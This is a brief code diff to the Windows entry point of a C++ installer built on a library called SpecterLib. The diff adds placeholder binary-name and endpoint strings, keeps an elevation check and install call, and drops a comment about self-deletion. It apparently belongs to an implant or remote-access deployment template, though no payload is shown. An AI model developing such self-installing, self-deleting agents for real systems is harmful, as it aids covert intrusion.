@@ -5,10 +5,12 @@
 #include "SpecterLib/SelfProcessUtils.h"
 
 
-int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
+int WINAPI wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int)
 {
-	static const std::wstring kProgramName = L"potato_master";
-	static const std::wstring kProgramPath = kProgramName + L".exe";
+	const std::wstring kProgramName = L"BINARY_NAME";
+	const std::wstring kProgramPath = kProgramName + L".exe";
+	const std::wstring kBaseEndpointUri = L"BASE_ENDPOINT";
+
 
 	if (SelfProcessUtils::IsProcessElevated())
 	{
@@ -28,8 +30,6 @@ int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
 	{
 		deployement.Install();
 	}
-
-	// TODO Delete Self code ?
 
 	return 0;
 }
